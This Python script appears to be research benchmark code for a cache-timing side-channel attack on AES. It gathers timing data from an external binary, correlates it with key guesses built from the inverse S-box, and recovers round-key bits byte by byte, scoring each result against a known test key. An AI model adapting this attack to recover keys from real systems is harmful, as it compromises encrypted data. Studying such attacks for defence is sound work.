# Copyright 2024 Zhiyuan Zhang
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import matplotlib.pyplot as plt
import numpy as np
import sys
import pandas as pd
import subprocess as oss
from scipy import stats
import time
import statistics

sample_count = 64

def fast_pearson(x, y):
    x = np.array(x)
    y = np.array(y)
    xv = x - x.mean(axis=0)
    yv = y - y.mean(axis=0)
    xvss = (xv * xv).sum(axis=0)
    yvss = (yv * yv).sum(axis=0)
    result = np.matmul(xv.transpose(), yv) / np.sqrt(np.outer(xvss, yvss))
    return np.maximum(np.minimum(result, 1.0), -1.0)

sbox= [
    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38,
    0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87,
    0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d,
    0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2,
    0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16,
    0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda,
    0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a,
    0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02,
    0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea,
    0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85,
    0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89,
    0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20,
    0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31,
    0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d,
    0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0,
    0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26,
    0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d
  ]

### Make a table
def xtime(x):
  return ((x<<1) ^ (((x>>7) & 1) * 0x1b))

def multiply(x,y):
   return (((y & 1) * x) ^ ((y>>1 & 1) * xtime(x)) ^ ((y>>2 & 1) * xtime(xtime(x))) ^ ((y>>3 & 1) * xtime(xtime(xtime(x)))) ^ ((y>>4 & 1) * xtime(xtime(xtime(xtime(x))))))


#### Only Compute it once
#### We are now plotting a table 4 * 256; four tables are for 0x0e, 0x09, 0x0b, 0x0d
big_table = [0] * 4
def make_table():
    four_array = [0xe, 0x9, 0xb, 0xd]
    for k in range(4): ### xor k1
        tmp_table_rc = [0] * 4
        for i in range(0,4): ### xor round constant
            tmp_table = [0] * 256
            for j in range(0,256): ### multiplication
                tmp_result = ((multiply(sbox[j], four_array[i]) >> 6) ^ k) & 0x3
                tmp_table[j] = int(tmp_result == 0)
            tmp_table_rc[i] = tmp_table
        big_table[k] = tmp_table_rc


def read_data():
    df = pd.read_csv('data1.csv', sep=' ')
    data_lines = df['ciphertext'].tolist()
    data = df['time'].tolist()
    timing_result = np.array(data)
    return [timing_result, data_lines]


def find_outlier(timing_result, upper_limit):
    q1 = np.percentile(timing_result, 25)
    q3 = np.percentile(timing_result, upper_limit)
    iqr = q3 - q1
    threshold = 1.5 * iqr
    outliers = np.where((timing_result < q1 - threshold) | (timing_result > q3 + threshold))
    #print(outliers)
    return outliers


def preprocess_data(timing_result, upper_limit):
    timing_result = timing_result.copy()
    outliers = find_outlier(timing_result, upper_limit)
     
    median_value = np.median(timing_result)
    for index in outliers:
        timing_result[index] = median_value

    return timing_result

def get_test_range(data_lines, byte):
    string0 = data_lines[0]
    string63 = data_lines[63]
    init_byte = int(string0[byte*2:byte*2+2],16)
    end_byte=int(string63[byte*2:byte*2+2],16)
    return [init_byte, end_byte]


high_correlation = 0.7
def analysis(init_byte, end_byte, timing_result):
    result = [0] * 16384
    count_final = 0
    highest_correlation = 0
    highest_result = [0] * 3
    for k0 in range(0,256):
        if (k0 & 0xC0) != (init_byte ^ 0x40) & 0xC0:
            continue
        for k1 in range(0,256):
            tmp_result = [0] * 64
            tmp_count = 0
            for pt in range(init_byte,end_byte+1):

                st0 = k0 ^ pt
                a0 = big_table[(k1 >> 6) & 0x3][0][st0]
                a1 = big_table[(k1 >> 4) & 0x3][1][st0]
                a2 = big_table[(k1 >> 2) & 0x3][2][st0]
                a3 = big_table[(k1 >> 0) & 0x3][3][st0]
                
                a = a0 or a1 or a2 or a3 #(a0 == 0) or (a1 == 0) or (a2 == 0) or (a3 == 0)
                tmp_result[tmp_count] = int(a)
                tmp_count += 1
            ### Once we have the tmp_result, we should be able to get pearson correlation 
            result[count_final] = tmp_result
            #pearson_result = abs(stats.pearsonr(tmp_result, timing_result)[0])
            pearson_result = abs(fast_pearson(tmp_result, timing_result)[0][0])
            
            ### Update the highest score
            if pearson_result > highest_correlation:
                highest_correlation = pearson_result
                highest_result = [(k0 & 0x3f), tmp_result, pearson_result]
            
            ### Return if higher than the threshold
            if pearson_result > high_correlation:
                #print(k0 & 0x3f, pearson_result)
                return [k0 & 0x3f, tmp_result, pearson_result]
            count_final += 1
    return highest_result

#### Recover one entire key
def recover_one_byte(byte, original_key, modify_byte0, num_of_cts, first_byte_flag):
    ## Run attack and collect timing result
    ##oss.call(['taskset', '-c', '1', './crun', '22', str(byte), '99', original_key])
    oss.call(['./crun', str(num_of_cts), str(byte), str(modify_byte0), original_key])

    readed_data = read_data() # return ciphertexts and timing_results
    timing_result = readed_data[0]
    cts = readed_data[1]
    test_range = get_test_range(cts, byte)
    result = [0] * 3 # Byte, array, perarson_result
    best_result = [0] * 3
    outlier_upper_limit = 95
    if first_byte_flag == 1:
        processed_timing_result = preprocess_data(timing_result, outlier_upper_limit)
        stdev = statistics.stdev(processed_timing_result)
        if (stdev < 80) :
            return best_result
    
    while result[2] < high_correlation:
        processed_timing_result = preprocess_data(timing_result, outlier_upper_limit)
        result = analysis(test_range[0], test_range[1], processed_timing_result)
        ### Store the best result
        if result[2] > best_result[2]:
            best_result = result.copy()
        
        ### If the pearson result is high enough, return it directly
        if result[2] >= high_correlation:
            return result
        outlier_upper_limit -= 5

        ### If no qualified, we return the highest score
        if outlier_upper_limit <= 80:
            return best_result

def recover_one_key(original_key, f0_key):
    first_keybyte = [0] * 3
    result = [0] * 3
    tried_ciphertext_count = 1
    correct_score = 0
    ciphertext_count = 0
    final_result = [0] * 16

    ### Recover first byte, need to try different ciphertexts
    ### Keep testing until we find a high_correlation
    while first_keybyte[2] < high_correlation: 
        tried_ciphertext_count += 1
        ciphertext_count += 1
        first_keybyte = recover_one_byte(0, original_key, 99, tried_ciphertext_count, 1)
        ciphertext_count += 63
        if tried_ciphertext_count > 400:
            return [correct_score, tried_ciphertext_count, final_result]
        #print(tried_ciphertext_count)

    ### So, if we can get the first byte, we should also get the rest. Otherwise, the first byte we get is incorrect
    if (int(f0_key[0:2], 16) & 0x3f) == first_keybyte[0] :
        correct_score += 1
    print(int(f0_key[0:2], 16) & 0x3f, first_keybyte[0], round(first_keybyte[2], 2))
    final_result[0] = [int(f0_key[0:2], 16) & 0x3f, first_keybyte[0], round(first_keybyte[2], 2)]
    ##exit()


    #### We want 0 in the result[1], which indicates that the monitored cache line is not accessed in the second round
    indices = np.where(np.array(first_keybyte[1]) == 0)[0]

    ### When recovering the second byte, we still want to have a high correlation result
    correct_indice = indices[0]
    for ind in indices:
        ### Recover the second byte
        ciphertext_count += 1
        result = recover_one_byte(1, original_key, ind, tried_ciphertext_count, 1)
        ciphertext_count += 63
        if result[2] > high_correlation :
            correct_indice = ind
            break
    if (int(f0_key[2:4], 16) & 0x3f) == result[0] :
        correct_score += 1
    print(int(f0_key[2:4], 16) & 0x3f, result[0], round(result[2], 2))
    final_result[1] = [int(f0_key[2:4], 16) & 0x3f, result[0], round(result[2], 2)]
    
    #### We should be safe to the next round 
    ### To recover the rest bytes, we just simply accept the highest result
    for i in range(2,16):
        result = recover_one_byte(i, original_key, correct_indice, tried_ciphertext_count, 0)
        ciphertext_count += 64
        if (int(f0_key[i*2:i*2+2], 16) & 0x3f) == result[0] :
            correct_score += 1
        print(int(f0_key[i*2:i*2+2], 16) & 0x3f, result[0], round(result[2], 2))
        final_result[i] = [int(f0_key[i*2:i*2+2], 16) & 0x3f, result[0], round(result[2], 2)]

    return [correct_score, ciphertext_count, final_result]


def main():
    make_table()
    f = open("round2_benchmark.csv", "a")
    f.write("score" + " <--> " + "cts" + " <--> " + "detail" + "\n")
    f.close()

    for test_count in range(1,11):
        oss.call(['./gen_key/crun', str(test_count)])
        fkey =  pd.read_csv('key.csv', sep=' ')
        f0_key = fkey['r0_key'].tolist()[0]
        original_key = fkey['origin_key'].tolist()[0]
        #print(f0_key, original_key)
        
        start = time.time()
        score = recover_one_key(original_key, f0_key)
        print(score[0],score[1], score[2])
        end = time.time()
        #print(str(score[0]) + " <--> " + str(score[1]) + " <--> " + str(score[2])+ " " + str(end - start)+ "\n")
        
        f = open("round2_benchmark.csv", "a")
        f.write(str(score[0]) + " <--> " + str(score[1]) + " <--> " + str(score[2])+ " " + str(end - start)+ "\n")
        f.close()
        print("Done " + str(test_count) + "...")

if __name__ == "__main__":
    main()
